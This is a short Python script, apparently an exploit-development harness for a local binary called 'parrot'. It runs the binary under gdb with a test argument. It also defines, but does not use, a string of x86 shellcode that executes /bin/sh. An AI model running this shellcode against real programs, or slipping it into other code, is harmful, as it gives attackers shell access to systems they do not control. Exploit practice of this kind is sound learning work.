import os

DEBUG = True

exploit  = "\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x50\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
exploit2 = "na pula"

if DEBUG:
    argv = ["/usr/bin/gdb", "--args"]
else:
    argv = []

argv += ["./parrot", exploit2]

os.execv(argv[0], argv)